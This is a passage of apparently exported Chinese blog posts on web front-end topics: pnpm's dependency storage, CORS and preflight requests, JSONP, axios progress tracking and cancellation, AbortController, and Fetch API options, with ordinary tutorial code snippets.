自建了依赖解析器，所有的依赖引用都必须由解析器执行，因此只能通过 yarn 命令来执行 node 脚本。 pnpm - performant npm 2017 年发布，定义为快速的，节省磁盘空间的包管理工具。 允许跨项目地共享同一版本的依赖。 如果同一依赖需要使用不同的版本，则仅有版本之间不同的文件会被存储起来。 pnpm 的根目录下的 node_modules 只包含 pakcage.json 中显式声明的依赖，并且这里实际上保存的是依赖的软链。 使用 pnpm 安装依赖后 node_modules 结构如下： node_modules ├── .pnpm │ ├── A@1.0.0 │ │ └── node_modules │ │ ├── A =&gt; &lt;store&gt;/A@1.0.0 │ │ └── B =&gt; ../../B@1.0.0 │ ├── B@1.0.0 │ │ └── node_modules │ │ └── B =&gt; &lt;store&gt;/B@1.0.0 │ ├── B@2.0.0 │ │ └── node_modules │ │ └── B =&gt; &lt;store&gt;/B@2.0.0 │ └── C@1.0.0 │ └── node_modules │ ├── C =&gt; &lt;store&gt;/C@1.0.0 │ └── B =&gt; ../../B@2.0.0 │ ├── A =&gt; .pnpm/A@1.0.0/node_modules/A └── C =&gt; .pnpm/C@1.0.0/node_modules/C 内容寻址存储 CAS 与依赖提升和扁平化的 node_modules 不同，pnpm 引入了另一套依赖管理策略：内容寻址存储。 store：该策略会通过 store 来存储所有的 node_modules 依赖，依赖的每个版本只会在系统中安装一次。 .pnpm：虚拟存储目录，所有直接和间接依赖项都链接到此目录中。该目录通过 name@version 来实现相同模块不同版本之间隔离和复用。 安装依赖：如果某个依赖在 sotre 目录中存在了话，就会直接从 store 目录里面去 hard-link，否则就会去下载一次。 pnpm store prune：提供了一种用于删除一些不被全局项目所引用到的 packages 的功能，例如有个包 axios@1.0.0 被一个项目所引用了，但是某次修改使得项目里这个包被更新到了 1.0.1 ，那么 store 里面的 1.0.0 的 axios 就就成了个不被引用的包，执行 pnpm store prune 就可以在 store 里面删掉它了。 幽灵依赖问题：只有直接依赖会平铺在 node_modules 下，子依赖不会被提升，不会产生幽灵依赖。 依赖分身问题：相同的依赖只会在全局 store 中安装一次。项目中的都是源文件的副本，几乎不占用任何空间，没有了依赖分身。 链接 硬链接 Hard link，可以理解为源文件的副本，项目里安装的其实是副本。 用户可以通过路径引用查找到全局 store 中的源文件，而且这个副本根本不占任何空间。 pnpm 会在全局 store 里存储硬链接，不同的项目可以从全局 store 寻找到同一个依赖。 .pnpm 中的每个文件都是来自内容可寻址存储的硬链接，指向全局 store 中安装的依赖。 符号链接 Symbolic link，也叫软连接，在 Windows 中使用的是连接点链接，pnpm 可以通过它找到对应磁盘目录下的依赖地址。 示例： 项目中有一个依赖 bar@1.0.0。 bar@1.0.0 也有一个依赖 foo@1.0.0。 node_modules 下面有 bar@1.0.0 和 .pnpm 目录，没有 foo@1.0.0。 bar@1.0.0 通过软链接指向 .pnpm/bar@1.0.0/node_modules/bar@1.0.0。 .pnpm/bar@1.0.0/node_modules/bar@1.0.0 又通过硬链接指向 store。 bar@1.0.0 依赖的 foo@1.0.0 会安装在跟自己的同一级。 .pnpm/bar@1.0.0/node_modules/foo@1.0.0 通过软链指向 .pnpm 中的 foo@1.0.0。 .pnpm/foo@1.0.0 一样通过硬链接指向 store。 pnpm 目前的缺点是兼容性、功能丰富度和社区生态等比较弱。 总结： 以上对比了几种不同的包管理方案：目前还没有完美的依赖管理方案。 它们有不同的 node_modules 结构，有嵌套，扁平，甚至没有 node_modules，不同的结构也伴随着兼容与安全问题。它们使用不同的依赖存储方式来节约磁盘空间，提升安装速度。但每种管理器都伴随新的工具和命令，不同程度的可配置性和扩展性，影响开发者体验。这些包管理器也对 monorepo 有不同程度的支持，会直接影响项目的可维护性和速度。 ","link":"https://zkrisj.github.io/post/npm-yarn-yarn2-pnpm-ji-chong-bao-guan-li-dui-bi/"},{"title":"JSONP、CORS 和 axios 的跨域","content":"同源策略是一个重要的安全策略，允许一个网页可以访问具有相同来源（有相同的 URI、主机名和端口号）的另一个网页的数据，但限制与另一个源的资源进行交互，默认阻止跨域获取资源。 CORS CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种基于 HTTP 头的机制，通过新增一组 HTTP 头，来决定网页如何处理跨域请求。即 CORS 给了 web 服务器这样的权限：服务器可以选择是否允许跨域请求访问到它的资源。2006 年 5 月提交了第一个 W3C 工作草案。2009 年 3 月，该草案更名为“跨域资源共享”，并于 2014 年 1 月被接受为 W3C 推荐。 请求标头包括： Access-Control-Request-Headers 用于发起一个预请求，告知服务器正式请求会使用那些 HTTP 头。 Access-Control-Request-Method 用于发起一个预请求，告知服务器正式请求会使用哪一种 HTTP 请求方法。 Origin 指示获取资源的请求是从什么域发起的。 响应标头包括： Access-Control-Allow-Origin 指示请求的资源能共享给哪些域。 Access-Control-Allow-Credentials 指示当请求的凭证标记为 true 时，是否响应该请求。 Access-Control-Allow-Headers 用在对预请求的响应中，指示实际的请求中可以使用哪些 HTTP 头。 Access-Control-Allow-Methods 指定对预请求的响应中，哪些 HTTP 方法允许访问请求的资源。 Access-Control-Expose-Headers 指示哪些 HTTP 头的名称能在响应中列出。 Access-Control-Max-Age 指示预请求的结果能被缓存多久。 例如，以下在设置了允许跨域的网址上，可以正常得到响应结果： const res = await fetch('https://cors-demo.glitch.me/allow-cors') .then(res =&gt; res.json()); // {message: &quot;You are handling CORS like a pro!&quot;} 原理 对于简单请求（请求方法只包括 HEAD、GET 或 POST，请求头只包括 Accept、Accept-Language、Content-Language 或值为 application/x-www-form-urlencoded、multipart/form-data、text/plain 类型的 Content-Type），浏览器直接发出 CORS 请求，就是在头信息之中，增加一个 Origin 字段。 假如站点 https://foo.example 的网页应用想要访问 https://bar.other 的资源，发送的请求标头： GET /resources/public-data/ HTTP/1.1 Host: bar.other User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Connection: keep-alive Origin: https://foo.example 请求首部字段 Origin 表明该请求来源于 http://foo.example。下面是响应标头： HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 00:23:53 GMT Server: Apache/2 Access-Control-Allow-Origin: * Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: application/xml [XML Data] 服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被 任意 外域访问。如果服务端仅允许来自 https://foo.example 的访问，服务端将返回以下标头：Access-Control-Allow-Origin: https://foo.example。本例中，使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。 对那些可能对服务器数据产生副作用的 HTTP 非简单请求，浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。使用预检请求以确定请求是否有权执行该操作，可以避免跨域请求对服务器的用户数据造成影响。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies 和 HTTP 认证 相关数据）。 假如站点 https://foo.example 的网页要向 https://bar.other 发送一个非简单请求，浏览器检测到，从 JavaScript 中发起的请求需要被预检，这时发送的请求标头为： OPTIONS /doc HTTP/1.1 Host: bar.other User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Connection: keep-alive Origin: https://foo.example Access-Control-Request-Method: POST Access-Control-Request-Headers: X-PINGOTHER, Content-Type 我们可以看到发送了一个使用 OPTIONS 方法的预检请求。OPTIONS 是 HTTP/1.1 协议中定义的方法，用以从服务器获取更多信息。该方法不会对服务器资源产生影响。首部字段 Access-Control-Request-Method 告知服务器，实际请求将使用 POST 方法。首部字段 Access-Control-Request-Headers 告知服务器，实际请求将携带两个自定义请求首部字段：X-PINGOTHER 与 Content-Type。服务器据此决定，该实际请求是否被允许。下面是响应标头： HTTP/1.1 204 No Content Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2 Access-Control-Allow-Origin: https://foo.example Access-Control-Allow-Methods: POST, GET, OPTIONS Access-Control-Allow-Headers: X-PINGOTHER, Content-Type Access-Control-Max-Age: 86400 Vary: Accept-Encoding, Origin Keep-Alive: timeout=2, max=100 Connection: Keep-Alive 服务器的响应携带了 Access-Control-Allow-Origin: https://foo.example，从而限制请求的源域。Access-Control-Allow-Methods: POST, GET, OPTIONS 表明服务器允许客户端使用 POST 和 GET 方法发起请求，Access-Control-Allow-Headers: X-PINGOTHER, Content-Type 表明服务器允许请求中携带字段 X-PINGOTHER 与 Content-Type。首部字段 Access-Control-Max-Age 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。在 Firefox 中，上限是 24 小时 （即 86400 秒）。 在 Chromium v76 之前， 上限是 10 分钟（即 600 秒)。 从 Chromium v76 开始，上限是 2 小时（即 7200 秒)。 Chromium 同时规定了一个默认值 5 秒。 如果值为 -1，表示禁用缓存，则每次请求前都需要使用 OPTIONS 预检请求。 预检请求完成之后，浏览器将发出实际请求。如果 https://bar.other 不接受来自该来源的跨站点请求，那么它将错误地响应 OPTIONS 请求，并且浏览器不会发出实际请求。以下是实际请求： POST /doc HTTP/1.1 Host: bar.other User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Connection: keep-alive X-PINGOTHER: pingpong Content-Type: text/xml; charset=UTF-8 Referer: https://foo.example/examples/preflightInvocation.html Content-Length: 55 Origin: https://foo.example Pragma: no-cache Cache-Control: no-cache &lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt; 实际响应如下： HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:40 GMT Server: Apache/2 Access-Control-Allow-Origin: https://foo.example Vary: Accept-Encoding, Origin Content-Encoding: gzip Content-Length: 235 Keep-Alive: timeout=2, max=99 Connection: Keep-Alive Content-Type: text/plain [Some XML payload] 以下是整个流程图： 比如我们使用 fetch 请求以下资源： await fetch(&quot;https://poster.prodapi.cn/api/link&quot;, { headers: { &quot;token&quot;: &quot;ApfrIzxCoK1DwNZOEJCwlrnv6QZ0PCdv&quot; }, body: '{&quot;title&quot;:&quot;人工智能+机器学习&quot;,&quot;id&quot;:2}', method: &quot;POST&quot;, }).then(res=&gt;res.json()); 打开控制台，可以看到发出了两次请求，一次是预检请求，一次是 fetch 请求。 向服务器发送 Cookies 对于跨源 XMLHttpRequest 或 Fetch 请求，浏览器不会发送身份凭证信息。但 XMLHttpRequest 或 Fetch 可以基于 HTTP cookies 和 HTTP 认证信息发送身份凭证。 假如 https://foo.example 的某脚本向 https://bar.other 发起一个 GET 请求，并设置 Cookies： const invocation = new XMLHttpRequest(); const url = 'https://bar.other/resources/credentialed-content/'; function callOtherDomain() { if (invocation) { invocation.open('GET', url, true); invocation.withCredentials = true; invocation.onreadystatechange = handler; invocation.send(); } } 第 7 行将 XMLHttpRequest 的 withCredentials 标志设置为 true，从而向服务器发送 Cookies。因为这是一个简单 GET 请求，所以浏览器不会对其发起“预检请求”。但是，如果服务器端的响应中未携带 Access-Control-Allow-Credentials: true，浏览器将不会把响应内容返回给请求的发送者。客户端发送的请求头如下： GET /resources/credentialed-content/ HTTP/1.1 Host: bar.other User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Connection: keep-alive Referer: https://foo.example/examples/credential.html Origin: https://foo.example Cookie: pageAccess=2 服务端的响应如下： HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:34:52 GMT Server: Apache/2 Access-Control-Allow-Origin: https://foo.example Access-Control-Allow-Credentials: true Cache-Control: no-cache Pragma: no-cache Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT Vary: Accept-Encoding, Origin Content-Encoding: gzip Content-Length: 106 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain [text/plain payload] 流程图如下： 需要注意的是，如果要发送 Cookie 这样附带身份凭证的请求时，Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie 也无法读取服务器域名下的 Cookie。另外，响应首部中也携带了 Set-Cookie 字段，将尝试对 Cookie 进行修改。如果用户设置其浏览器拒绝所有第三方 cookies，那么将不会被保存。 获取响应头 在跨源访问时，XMLHttpRequest 对象的 getResponseHeader() 方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。Access-Control-Expose-Headers 头让服务器把允许浏览器访问的头放入白名单，例如：Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header。这样浏览器就能够通过 getResponseHeader 访问 X-My-Custom-Header 和 X-Another-Custom-Header 响应头了。 使用 实际使用中，我们只需要在服务端配置允许跨域的响应 HTTP 头。 PHP 的服务端设置： &lt;?php header('Access-Control-Allow-Origin:*'); // 接下来就可以给跨域请求返回数据 ?&gt; nodeJS http 模块的服务端设置： require('http').createServer(function(req, res) { res.setHeader('Access-Control-Allow-Origin', '*'); res.setHeader('Access-Control-Allow-Methods', '*'); // 默认只允许简单请求方法 res.setHeader('Access-Control-Allow-Headers', '*'); // 默认只允许简单请求标头 res.end(`hello`); }).listen(8080, 'localhost', function() { console.log(this.address()); }); express 的中间件设置： app.use(function(req, res, next) { res.setHeader('Access-Control-Allow-Origin', '*'); res.setHeader('Access-Control-Allow-Methods', '*'); // 默认只允许简单请求方法 res.setHeader('Access-Control-Allow-Headers', '*'); // 默认只允许简单请求标头 next(); }); JSONP JSONP 指的是 JSON with Padding。鲍勃·伊波利托（Bob Ippolito）于 2005 年 12 月提出了 JSONP 最原始的提案，其中填充部分为回调函数。 原理 由于同源策略，从另一个域请求文件会引起问题，而嵌入的跨域资源不受同源策略约束。JSONP 利用了这个开放策略，使用 script 标签替代 XMLHttpRequest 对象或 fetch 来请求数据。用 JSONP 抓到的资料并不是 JSON，而是任意的 JavaScript 代码。 使用步骤 php 服务端设置响应 JavaScript 代码： &lt;?php $myJSON = '{ &quot;name&quot;:&quot;Bill Gates&quot;, &quot;age&quot;:62, &quot;city&quot;:&quot;Seattle&quot; }'; echo &quot;myFunc(&quot;.$myJSON.&quot;);&quot;; ?&gt; 本地请求服务端 JSONP 脚本： &lt;script src=&quot;https://www.w3school.com.cn/demo/demo_php_jsonp.php&quot; defer&gt;&lt;/script&gt; 本地设置 JavaScript 回调函数： function myFunc(myObj) { document.getElementById(&quot;demo&quot;).innerHTML = myObj.name; } nodeJS 服务端设置响应 JavaScript 代码： require('http').createServer(function(req, res) { const origin = req.headers.host + req.url; const cb = new URL(origin).searchParams.get('cb'); res.end(`${cb}({name: 'Tom', age: 12, city: 'Seattle'})`); }).listen(8080, 'localhost', function() { console.log(this.address()); }); 本地请求服务端 JSONP 脚本： &lt;script src=&quot;http://localhost:8080?cb=myFunc&quot; defer&gt;&lt;/script&gt; 本地设置 JavaScript 回调函数： function myFunc(myObj) { document.getElementById(&quot;demo&quot;).innerHTML = myObj.name; } jsonp 封装 jsonp 封装，每个网站的 callbackKey 可能不一样，但通常是 cb： function jsonp({ url, params = {}, callbackKey = 'cb' }) { if (typeof arguments[0] === 'string') url = arguments[0]; return new Promise((resolve, reject) =&gt; { const scriptEle = document.createElement('script'); params[callbackKey] = 'cb'; scriptEle.src = `${url}?${Object.keys(params).map(v=&gt;`${v}=${encodeURIComponent(params[v])}`).join('&amp;')}`; document.head.appendChild(scriptEle); window.cb = data =&gt; { resolve(data); delete window.cb; document.head.removeChild(scriptEle); }; }); } CORS vs JSONP JSONP 仅支持 GET 请求方法，但 CORS 还支持其他类型的 HTTP 请求。 CORS 使开发者能够使用常规 XMLHttpRequest 或 fetch，它有比 JSONP 更好的错误处理。 使用远程网站的 script 标签会让远程网站得以注入任何内容至网站里。如果远程的网站有跨站点脚本漏洞，原来的网站也会受到影响。粗略的 JSONP 部署很容易受到 跨站请求伪造（CSRF/XSRF） 的攻击。因为 &lt;script&gt; 标签在浏览器里不遵守同源策略，恶意网页可以要求并获取带有用户个人隐私资料的网站的 JSON 资料。当用户正登录带有用户个人隐私资料的网站时，使得该恶意网站得以操作该 JSON 资料，可能泄漏用户的密码或是其他敏感资料。 JSONP 的主要优势在于它能够在支持 CORS 之前的旧版浏览器（Opera Mini 和 Internet Explorer 9 及更早版本）上工作。 代理服务器 服务器之间通信不会出现跨域的问题，因为同源策略是浏览器的策略。所以我们可以申请一个和页面在同一个源的代理服务器，然后把请求转发到有数据的服务器上，得到数据后代理服务器再返回给浏览器。 Vue 和 axios 在 vue.config.js 或 webpack 的配置文件中，新增以下代码： module.exports = { devServer: { host: '127.0.0.1', port: 8080, open: true, // 启动时自动打开浏览器 proxy: { '/api': { // 代理标识，/api 前缀的 url 使用代理 target: &quot;http://xxx.xxx.xx.xx:8080&quot;, // 后台服务器地址 changeOrigin: true, // 是否跨域 pathRewrite: { // 实际 url 中的 '/api' 替换为 '' '^/api': '' } } } } } 配置 axios 的根路径： axios.defaults.baseURL = '/api'; 引用资料： 几种常见的跨域解决方法 跨域资源共享 (CORS) ","link":"https://zkrisj.github.io/post/jsonpcors-he-axios-de-kua-yu/"},{"title":"axios 上传下载进度显示和取消请求","content":"介绍 Axios 是一个基于 promise 网络请求库，作用于 node.js 和浏览器中。 它是 isomorphic 的(同构，即同一套代码可以运行在浏览器和 node.js 中)。在服务端它使用原生 node.js http 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。 特性 从浏览器创建 XMLHttpRequests 从 node.js 创建 http 请求 支持 Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换 JSON 数据 客户端支持防御 XSRF 上传和下载进度显示 由于 Axios 是基于 XMLHttpRequests 的，所以可以使用 XMLHttpRequests 接口的 ProgressEvent 事件监听下载或上传进度。代码如下： axios('https://fetch-progress.anthum.com/30kbps/images/sunrise-baseline.jpg', { responseType: 'blob', onDownloadProgress(e) { if (e.lengthComputable) { result.textContent = Math.round((e.loaded * 100) / e.total) + '%'; if (e.loaded === e.total) { result.textContent += `，用时：${e.timeStamp.toFixed(0)}ms`; } } }, }) const data = new FormData(); data.append('file', input.files[0]); data.append('username', 'foo'); // 或者已存在表单元素 // const data = new FormData(form:HTMLFormElement)); axios.post('upload', data, { headers: {'Content-Type': 'multipart/form-data;charset=utf-8'}, onUploadProgress(e) { if (e.lengthComputable) { result.textContent = Math.round((e.loaded * 100) / e.total) + '%'; if (e.loaded === e.total) { result.textContent += `，用时：${e.timeStamp.toFixed(0)}ms`; } } }, }) 其中的事件属性为： ProgressEvent.lengthComputable 只读 是一个 Boolean 标志，表示底层流程将需要完成的总工作量和已经完成的工作量是否可以计算。换句话说，它告诉我们进度是否可以被测量。 ProgressEvent.loaded 只读 是一个 long 类型数据，表示底层流程已经执行的工作总量。可以用这个属性和 ProgressEvent.total 计算工作完成比例。当使用 HTTP 下载资源，它只表示内容本身的部分，不包括首部和其它开销。 ProgressEvent.total 只读 是一个 long 类型数据，表示正在执行的底层流程的工作总量。当使用 HTTP 下载资源，它只表示内容本身的部分，不包括首部和其它开销。 取消请求 使用 Axios CancelToken API，但从 v0.22.0 开始不推荐使用。 const CancelToken = axios.CancelToken; const source = CancelToken.source(); axios.get('/user/12345', { cancelToken: source.token }).catch(function (thrown) { if (axios.isCancel(thrown)) { console.log('Request canceled', thrown.message); } else { // 处理错误 } }); axios.post('/user/12345', { name: 'new name' }, { cancelToken: source.token }).catch(function (thrown) { if (axios.isCancel(thrown)) { console.log('Request canceled', thrown.message); } else { // 处理错误 } }) // 取消请求（message 参数是可选的） source.cancel('Operation canceled by the user.'); // 也可以通过传递一个 executor 函数到 CancelToken 的构造函数来创建一个 cancel token： let cancel; axios.get('/user/12345', { cancelToken: new CancelToken(function executor(c) { // executor 函数接收一个 cancel 函数作为参数 cancel = c; }) }).catch(function (thrown) { if (axios.isCancel(thrown)) { console.log('Request canceled', thrown.message); } else { // 处理错误 } }); // 取消请求 cancel(); 从 v0.22.0 开始，Axios 支持以 fetch API 方式—— AbortController 取消请求： const controller = new AbortController(); axios.get('/foo/bar', { signal: controller.signal }).then(function(response) { //... }).catch(err =&gt; console.dir(err)); // 取消请求 controller.abort(); 可以使用同一个 CancelToken 或 signal 取消多个请求。可以使用这两种取消 API，即使是针对同一个请求： const controller = new AbortController(); const CancelToken = axios.CancelToken; const source = CancelToken.source(); axios.get('/user/12345', { cancelToken: source.token, signal: controller.signal }).catch(function (thrown) { if (axios.isCancel(thrown)) { console.log('Request canceled', thrown.message); } else { // 处理错误 } }); axios.post('/user/12345', { name: 'new name' }, { cancelToken: source.token }) // 取消请求 (message 参数是可选的) source.cancel('Operation canceled by the user.'); // 或 controller.abort(); 下载过程中断请求 const source = axios.CancelToken.source(); axios('https://fetch-progress.anthum.com/30kbps/images/sunrise-baseline.jpg', { cancelToken: source.token, responseType: 'blob', onDownloadProgress(e) { if (e.lengthComputable) { progress.textContent = Math.round((e.loaded * 100) / e.total) + '%'; if (e.loaded === e.total) { progress.textContent += `，用时：${e.timeStamp.toFixed(0)}ms`; } } } }).then(res =&gt; { console.log(res); i1.src = URL.createObjectURL(res.data); }).catch(err =&gt; progress.textContent = err.message); stopBtn.onclick = e =&gt; source.cancel('Operation canceled by the user.'); ","link":"https://zkrisj.github.io/post/axios-shang-chuan-xia-zai-jin-du-xian-shi-he-qu-xiao-qing-qiu/"},{"title":"AbortController AbortSignal 的使用","content":"介绍 AbortController 接口表示一个控制器对象，用来中止一个或多个请求。使用 AbortController.signal 属性可以获取其关联的 AbortSignal 对象的引用。 AbortSignal 对象表示一个信号，可以完成与 DOM 请求的通信。 方法和属性 AbortController.signal 返回一个 AbortSignal 对象实例，用来传递中止信号。 AbortController.abort() 中止它的 signal 对应的请求。 AbortSignal.aborted 以 Boolean 表示与之通信的请求是否被终止（true）或未终止（false）。 AbortSignal.reason 一旦信号中止，提供中止原因。 AbortSignal.throwIfAborted() 如果信号已中止，则会抛出信号的中止原因；否则它什么也不做。 静态方法 AbortSignal.abort(reason) 返回一个已设置为 aborted（并且不会触发 abort 事件）的 AbortSignal。该方法的目的类似于 Promise.reject。如果未指定 reason，则将原因设置为 DOMException。 静态方法 AbortSignal.timeout(time) 返回一个 AbortSignal，它将在指定时间后自动中止。 事件属性 AbortSignal.onabort 当 abort 事件触发时，即当信号正在与之通信的 DOM 请求被中止时调用。 其他 AbortSignal 接口从其父接口 EventTarget 继承属性和方法。 使用场景 下面的示例我们通过封装 Fetch API 来下载一段视频。当一个 fetch 请求初始化时，我们把 AbortSignal 作为一个选项 { signal } 传递到到请求对象，然后就可以通过调用 AbortController.abort() 来中止请求。当 abort() 方法被调用时，这个 fetch 请求将 reject 一个名为 AbortError 的 DOMException。 const controller = new AbortController(); const signal = controller.signal; downloadBtn.addEventListener('click', fetchVideo); abortBtn.addEventListener('click', function() { controller.abort('Download aborted'); }); function fetchVideo() { fetch(url, { signal }).then(function(response) { //... }).catch(function(e) { reports.textContent = 'Download error: ' + e.message; }); } 下面的示例封装了一个 WebScocket，并通过 AbortSignal 来关闭其连接。 function abortableSocket(url, signal) { const w = new WebSocket(url); if (signal.aborted) { w.close(); // signal 已经终止的情况下马上关闭 websocket } signal.addEventListener('abort', () =&gt; w.close()); return w; } 我们经常需要在 js 中处理 dom 的监听和卸载工作。但是下面的例子由于事件监听和卸载传入的函数不是同一个引用时不会生效的。 window.addEventListener('resize', () =&gt; doSomething()); // 不会生效 window.removeEventListener('resize', () =&gt; doSomething()); 因此我们经常需要一些额外的代码去维护这个回调函数的引用的一致性。有了 AbortSignal 之后我们就可以通过 addEventListener 第三个参数我们可以传递一个 signal，当 signal 中止时，事件监听将被移除。 const controller = new AbortController(); const { signal } = controller; window.addEventListener('resize', () =&gt; doSomething(), { signal }); controller.abort(); 在 JavaScript 中我们可能需要在对象中管理非常复杂的生命周期，比如先执行开启然后执行一系列逻辑后终止。 const someObject = new SomeObject(); someObject.start(); // 执行一些操作后 someObject.stop(); 这种情况可以通过 AbortSignal 进行实现。 const controller = new AbortController(); const someObject = new SomeObject(controller.signal); // 执行一些操作后 controller.abort(); 通过 AbortSignal 实现的好处是： 这能非常清晰地表示这个对象只能被执行一次，只能从开始到结束，而不能反过来。如果它终止了后想再次使用则需要再次创建一个对象。 可以在很多地方共享一个 signal。我们无需持有多个 SomeObject 的实例。只需要调用 controller.abort()，这些 SomeObject 的实例都能被终止掉。 如果 SomeObject 内部也有调用像 fetch 之类的内部 api 只需要把这个 signal 继续传递，则 fetch 也能被一起终止掉。例如以下代码： export class SomeObject { constructor(signal) { this.signal = signal; // 一些请求 const p = fetch('/json', { signal }); } // 执行复杂操作 doComplexOperation() { if (this.signal.aborted) { throw new Error(`thing stopped`); } for (let i = 0; i &lt; 1_000_000; ++i) { // ... } } } 我们通常会在 React Hook useEffect 中进行一些异步 api 调用。可以借助 signal 在下一次 useEffect 重新调用时将前一次的调用终止。 function FooComponent({ something }) { useEffect(() =&gt; { const controller = new AbortController(); const { signal } = controller; const p = (async () =&gt; { const j = await fetch(url + something, { signal }); })(); return () =&gt; controller.abort(); }, [something]); return &lt;&gt;...&lt;&gt;; } 也可以封装一个 useEffectAsync 的 Hook。 function useEffectAsync(cb, dependence) { const controller = new AbortController(); const { signal } = controller; useEffect(() =&gt; { cb(signal); return () =&gt; controller.abort(); }, dependence) } 总结 AbortController 和 AbortSignal 提供了一些用来中止请求和事件的接口，帮助我们提前终止请求进而节约一些资源，也给我们带来了一些新的开发模式。 ","link":"https://zkrisj.github.io/post/abortcontroller-abortsignal-de-shi-yong/"},{"title":"Fetch API 的使用","content":"介绍 Fetch 是一个用来获取网络资源的 API，与 XMLHttpRequest 功能基本相同，但 Fetch 使用 Promise 处理响应，而不是回调函数。 语法 Promise&lt;Response&gt; fetch(input:string|Request[, options:object]); 当接收到一个代表错误的 HTTP 响应状态码时，从 fetch() 返回的 Promise 不会被标记为 reject，即使是 404 或 500 状态，也都会将 Promise 状态标记为 resolve（如果响应的 HTTP 状态码不在 200 - 299 的范围内，则设置 resolve 返回值的 ok 属性为 false）。只有当网络故障时或请求被阻止时，才会被标记为 reject。 options method: 请求使用的方法，如 GET、POST。 headers: 请求的头信息，可以为 Headers 对象或包含 Headers 属性和值的对象字面量。 body: 请求的 body 信息：Blob、FormData、URLSearchParams 对象或者字符串。注意 GET 或 HEAD 方法的请求不能包含 body 信息。 signal: 指定一个 AbortSignal 实例，用于取消 fetch() 请求。 keepalive：用于页面卸载时，告诉浏览器在后台保持连接，继续发送数据。一个典型的场景就是，用户离开网页时，脚本向服务器提交一些用户行为的统计信息。这时，如果不用 keepalive 属性，数据可能无法发送，因为浏览器已经把页面卸载了。 mode: 请求的模式，如 cors（默认值，允许跨域请求。）、no-cors（请求方法只限于 GET、POST 和 HEAD，并且只能使用有限的几个简单标头，不能添加跨域的复杂标头，相当于提交表单所能发出的请求。）或者 same-origin（只允许同源请求）。 credentials: 请求的 credentials，same-origin（默认值，同源请求时发送 cookie，跨域请求时不发送。）、omit（一律不发送）或者 include（不管同源请求，还是跨域请求，一律发送 cookie。）。为了在当前域名内自动发送 cookie，必须提供这个选项，从 Chrome 50 开始，这个属性也可以接受 FederatedCredential 实例或是一个 PasswordCredential 实例。 cache: 请求的 cache 模式：default、 no-store、 reload 、 no-cache、 force-cache 或者 only-if-cached。 default：默认值，先在缓存里面寻找匹配的请求。 no-store：直接请求远程服务器，并且不更新缓存。 reload：直接请求远程服务器，并且更新缓存。 no-cache：将服务器资源跟本地缓存进行比较，有新的版本才使用服务器资源，否则使用缓存。 force-cache：缓存优先，只有不存在缓存的情况下，才请求远程服务器。 only-if-cached：只检查缓存，如果缓存里面不存在，将返回504错误。 redirect: 可用的 redirect 模式：follow (自动跟随重定向), error (如果产生重定向 fetch() 将自动终止并抛出错误），或者 manual (fetch() 不跟随 HTTP 跳转，但是 response.url 属性会指向新的 URL，response.redirected 属性会变为 true，由开发者自己决定后续如何处理跳转。)。在 Chrome 中默认使用 follow（Chrome 47 之前的默认值是 manual）。 referrer: no-referrer、client 或一个 URL。默认是 client。 referrerPolicy: 指定了 HTTP 头部 referer 字段的值。可能为以下值之一：no-referrer、 no-referrer-when-downgrade、origin、origin-when-cross-origin、 unsafe-url。 integrity: 请求的 SRI（子资源完整性（Subresource Integrity）是允许浏览器检查其获得的资源（例如从 CDN 获得的）是否被篡改的一项安全特性。它通过验证获取文件的哈希值和你提供的哈希值是否一样来判断资源是否被篡改。比如，下载文件时，检查文件的 SHA-256 哈希值是否相符，确保没有被篡改。) 值（例如： sha256-BpfBw7ivV8q2jLiT13fxDYAe2tJllusRSZ273h2nFSE=）。 const response = fetch(url, { method: &quot;GET&quot;, headers: { &quot;Content-Type&quot;: &quot;text/plain;charset=UTF-8&quot; }, body: undefined, referrer: &quot;about:client&quot;, referrerPolicy: &quot;no-referrer-when-downgrade&quot;, mode: &quot;cors&quot;, credentials: &quot;same-origin&quot;, cache: &quot;default&quot;, redirect: &quot;follow&quot;, integrity: &quot;&quot;, keepalive: false, signal: 